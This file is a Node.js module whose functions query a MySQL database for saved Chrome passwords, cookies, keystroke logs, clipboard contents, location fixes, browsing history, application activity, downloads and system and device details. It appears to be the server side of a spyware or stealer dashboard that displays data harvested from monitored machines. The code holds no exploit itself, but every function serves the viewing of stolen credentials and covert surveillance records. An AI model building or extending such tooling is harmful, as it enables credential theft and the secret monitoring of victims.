const mysql = require("mysql");
const connection = require("../config/DBConfig");
const { formatDateString, formatTimeString } = require("../utils/mainUtils");

exports.getchromepasswords = (callback) => {
  const query =
    "SELECT origin_url, action_url, username,password  FROM chrome_passwords";

  // Execute the query
  connection.query(query, (err, results) => {
    if (err) {
      console.error("MySQL query error:", err);
      callback(err, null);
    } else {
      callback(null, results);
    }
  });
};
exports.getCookie = (callback) => {
  const query = "SELECT * FROM cookies";

  // Execute the query
  connection.query(query, (err, results) => {
    if (err) {
      console.error("MySQL query error:", err);
      callback(err, null);
    } else {
      callback(null, results);
    }
  });
};

exports.getkeystrokes = (callback) => {
  const query = "SELECT time, key_data  FROM keystrokes order by time DESC;";

  // Execute the query
  connection.query(query, (err, results) => {
    if (err) {
      console.error("MySQL query error:", err);
      callback(err, null);
    } else {
      // Map over the results and format the time field
      const formattedResults = results.map((result) => {
        const formattedTime = formatTimeString(result.time);
        return { ...result, time: formattedTime };
      });

      callback(null, formattedResults);
    }
  });
};

exports.getclipboard = (callback) => {
  const query = "SELECT time, data  FROM clipboard order by time DESC;";

  // Execute the query
  connection.query(query, (err, results) => {
    if (err) {
      console.error("MySQL query error:", err);
      callback(err, null);
    } else {
      // Map over the results and format the time field
      const formattedResults = results.map((result) => {
        const formattedTime = formatDateString(result.time);
        return { ...result, time: formattedTime };
      });
      callback(null, formattedResults);
    }
  });
};

exports.getlocation = (callback) => {
  const query =
    "SELECT google_maps_link,city,country,time  FROM location_info order by time DESC;";

  // Execute the query
  connection.query(query, (err, results) => {
    if (err) {
      console.error("MySQL query error:", err);
      callback(err, null);
    } else {
      // Map over the results and format the time field
      const formattedResults = results.map((result) => {
        const formattedTime = formatDateString(result.time);
        return { ...result, time: formattedTime };
      });
      callback(null, formattedResults);
    }
  });
};

exports.getbrowserhistory = (callback) => {
  const query =
    "SELECT title,url,last_visit_time  FROM browser_history order by last_visit_time DESC;";

  // Execute the query
  connection.query(query, (err, results) => {
    if (err) {
      console.error("MySQL query error:", err);
      callback(err, null);
    } else {
      // Map over the results and format the time field
      const formattedResults = results.map((result) => {
        const formattedTime = formatDateString(result.last_visit_time);
        return { ...result, time: formattedTime };
      });
      callback(null, formattedResults);
    }
  });
};

exports.getapplications = (callback) => {
  const query =
    "SELECT app_name,action,time  FROM applications order by time DESC;";

  // Execute the query
  connection.query(query, (err, results) => {
    if (err) {
      console.error("MySQL query error:", err);
      callback(err, null);
    } else {
      // Map over the results and format the time field
      const formattedResults = results.map((result) => {
        const formattedTime = formatDateString(result.time);
        return { ...result, time: formattedTime };
      });
      callback(null, formattedResults);
    }
  });
};

exports.getrecentdownloads = (callback) => {
  const query = "SELECT time,file_name  FROM downloads order by time DESC;";

  // Execute the query
  connection.query(query, (err, results) => {
    if (err) {
      console.error("MySQL query error:", err);
      callback(err, null);
    } else {
      // Map over the results and format the time field
      const formattedResults = results.map((result) => {
        const formattedTime = formatDateString(result.time);
        return { ...result, time: formattedTime };
      });
      callback(null, formattedResults);
    }
  });
};

exports.getsysteminfo = (callback) => {
  const query =
    "SELECT system_specifications,user_accounts, connected_devices  FROM system_info order by time DESC;";

  // Execute the query
  connection.query(query, (err, results) => {
    if (err) {
      console.error("MySQL query error:", err);
      callback(err, null);
    } else {
      callback(null, results);
    }
  });
};

exports.getdeviceinfo = (callback) => {
  const query = "SELECT device_name,device_id  FROM devices_info";

  // Execute the query
  connection.query(query, (err, results) => {
    if (err) {
      console.error("MySQL query error:", err);
      callback(err, null);
    } else {
      callback(null, results);
    }
  });
};

exports.getdevice_ID = (callback) => {
  const query = "SELECT device_id  FROM devices_info";

  // Execute the query
  connection.query(query, (err, results) => {
    if (err) {
      console.error("MySQL query error:", err);
      callback(err, null);
    } else {
      callback(null, results);
    }
  });
};
